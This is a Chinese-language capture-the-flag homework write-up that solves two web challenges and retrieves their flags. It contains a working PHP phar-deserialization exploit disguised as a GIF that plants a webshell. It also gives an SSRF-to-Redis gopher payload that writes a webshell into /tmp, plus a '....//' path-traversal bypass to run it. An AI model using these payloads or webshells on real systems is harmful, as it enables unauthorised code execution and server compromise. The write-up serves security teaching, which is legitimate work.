---
tags: 2020 程式安全
---
# HW6
## Rero Meme
### 題目分析
* 題目直接給出網站的source code
* 網站一開始會要求使用者輸入名稱來登入在登入的時候會用is_dir檢查在images這個資料夾底下有沒有一個資料夾名字是使用者的名稱如果沒有就用mkdir去產生一個資料夾
* 接著就會登入到網站使用者可以上傳一張gif的圖片並且給這張圖片一個title
* 當server收到使用者上傳的圖片會檢查是不是gif檔之後會用file_get_contents把圖片內容讀出來然後之後再用file_put_contents把他存在images/$username底下並命名為剛剛輸入的title.gif
* 使用者上傳在server那邊/images/$username底下所有.gif的檔案都會被讀出來顯示在網頁上
### 漏洞
* 在檢查上傳的圖片時是拿檔頭的資訊來檢查是不是gif檔所以如果可以偽造一個惡意的檔案檔頭跟gif一樣他就會成功通過檢查上傳到server
* 在檢查有沒有資料夾名稱跟使用者的名稱一樣時用到is_dir但是is_dir的參數如果被傳入`phar://`他就會去解析phar的協議然後去讀phar的檔案做反序列化
* 輸入的使用者名稱沒有做檢查可以輸入任意的內容之後這個會被當作參數送到is_dir所以就等於is_dir的參數可控可以構造出`phar://`去執行反序列化
### Exploit
* 因為我們可以任意構造一個使用者名稱透過is_dir觸發phar的反序列化
* 然後我們可以看到在Meme這個class的__destruct會用file_put_contents
```php=
function __destruct()
{
    if ($this->content != NULL)
        file_put_contents($this->filename, $this->content);
}
```
* 所以只要控好Meme的this->filename和this->content這樣在觸發反序列化的時候他會去呼叫__destruct這樣我們就可以透過這個file_put_contents在server寫一個webshell
* 所以就去寫一個能夠生成phar檔的php
* 把content塞進`<?php system($_GET[a]);?>`把filename塞`images/c8c8c8c8c8c8.php`因為他會在images這個資料夾使用mkdir產生新的資料夾所以就代表images這個資料夾是可寫的所以就把webshell寫在這
* 然後因為server看檢查上傳的東西的檔頭看他是不是gif檔的檔頭但是phar的規範並沒有規定檔頭是什麼所以就可以在phar的檔頭塞進GIF89a這樣就能把他偽裝成gif檔通過檢查成功上傳
```php=
<?php
class Meme
{
    public $title;
    public $author;
    public $filename;
    private $content = NULL;
    function __construct($title, $author, $content = NULL)
    {
        $this->title = "admin";
        $this->author = "admin";
        $this->content = "<?php system(\$_GET[a]);?>";
        $this->filename = "images/c8c8c8c8c8c8.php";
    }
    function __destruct()
    {
        if ($this->content != NULL)
            file_put_contents($this->filename, $this->content);
    }
}

$obj = new Meme("admin", "admin", "444", "555");
$p = new Phar('./1.phar', 0);
$p->startBuffering();
$p->setStub('GIF89a<?php __HALT_COMPILER(); ?>');
$p->setMetadata($obj);
$p->addFromString('1.txt','text');
$p->stopBuffering();
rename('./1.phar', '77.gif');
?>
```
* 成功上傳之後他就會被存在images/$username/$title.gif我把名字叫做c8c8c8c8c8c8然後title取77所以他就被存成images/c8c8c8c8c8c8/77.gif
* 之後我們就把cookie清空再回到登入的頁面構造一個username去觸發images/c8c8c8c8c8c8/77.gif這個phar檔的反序列化
* 因為他登入的時候會把目錄改到images底下所以payload就變成`phar://c8c8c8c8c8c8/77.gif`這樣就能成功觸發剛剛上傳的phar檔在images底下寫一個c8c8c8c8c8c8.php的webshell
* 然後再用`http://rero.splitline.tw:8893/images/c8c8c8c8c8c8.php?a=cat%20/fl*`就能把flag讀出來了
>FLAG{レロレロ?RERO!レロレロ,RERO?レロレロ~}
## 陸拾肆基底編碼之遠端圖像編碼器
### 題目分析
* 題目會去抓使用者輸入圖片的網址的圖片然後轉換成base64
* 但是並沒有對輸入的內容做檢查導致存在SSRF的漏洞
### 漏洞
* 存在SSRF的漏洞並可以透過內網的服務進一步做到RCE
* 存在LFI的漏洞會把webshell給跑起來
### Exploit
* 因為有輸入網址的地方所以可能就存在SSRF的漏洞所以先用`file:///var/www/html/index.php`試試看
* 結果發現他變成無法顯示的圖片但是有base64的內容去decode後發現把index.php的source code給讀出來了所以知道他有SSFR的漏洞
* index.php裡面會發現有LFI的漏洞他會把用get取得的page的內容加上.inc.php的內容給include進來
```php=
<?php
    $page = str_replace("../", "", $_GET['page'] ?? 'home');
    include("page/$page.inc.php");
?>
```
* 接著就進一步去讀這台server的apache的config檔案之類的看有沒有甚麼其他的內容
* 然後讀到`/proc/net/tcp`得時候可以看到有哪些TCP的服務會得到像下面的結果  
![](https://i.imgur.com/8cF6v19.png)
* 這邊是用16進位表示這台server上面哪些port有在用像是第一個0100007F:69FE就是代表127.0.0.1底下的27134 port
* 所以可以用一開始找到的SSRF的洞去對這些port發get請求看看會有甚麼結果但是有檢查不能輸入127.0.0.1所以就試試看用其他方式例如0.0.0.0之類的會發現可以成功繞過檢查
* 當輸入`http://0.0.0.0:27134`的時候他會顯示`-ERR wrong number of arguments for 'get' command`去查一下會發現這個是redis的錯誤訊息所以就知道在這台server上的27134 port有跑redis
* redis是一個資料庫系統但是可以利用他構造惡意的payload並儲存下來而且這個server沒有限制使用gopher所以就可以用gopher去操作redis來寫一個webshell來達成RCE
* 用redis構造的payload如下寫一個webshell並且把檔案存在/tmp底下因為redis沒有root的權限不能直接把檔案寫在/var/www/html底下所以就寫在/tmp然後因為LFI的漏洞會include xxx.inc.php所以就要把webshell的副檔名寫成.inc.php
```
FLUSHALL
SET myshell "<?php system($_POST['cmd']) ?>"
CONFIG SET DIR /tmp
CONFIG SET DBFILENAME c87638787.inc.php
SAVE
QUIT
```
* 轉成gopher的語句之後就變成  
`gopher://0.0.0.0:27134/_FLUSHALL%0aSET myshell "<?php system($_POST['cmd']) ?>"%0aCONFIG SET DIR /tmp%0aCONFIG SET DBFILENAME c87638787.inc.php%0aSAVE%0aQUIT`
* 把這個惡意的gopher語具送到SSRF的洞這樣就在tmp底下寫入了c87638787.inc.php這個檔案裡面有`<?php system($_POST['cmd']) ?>`的語句
* 接著只要去把我們構造的webshell給include進來然後用post的方式給他參數就成功RCE了
* 因為她去include的目錄不是我們要的位置我們的webshell在/tmp底下所以要先把目錄改到/tmp底下
* 他會檢查輸入的內容是不是有`../`會被拿掉但是只要輸入`....//`這樣中間一個`../`被拿掉後組合起來還是`../`這樣就可以回到上一層所以就用很多的`....//`就可以確保他到`/`了
* 所以最後就會變成`http://base64image.splitline.tw:8894/?page=....//....//....//....//....//....//....//....//....//tmp/c87638787`然後用post的方式傳入`cmd=cat /fl*`就能夠成功拿到flag
>FLAG{data:text/flag;r3d1s-s3rv3r} 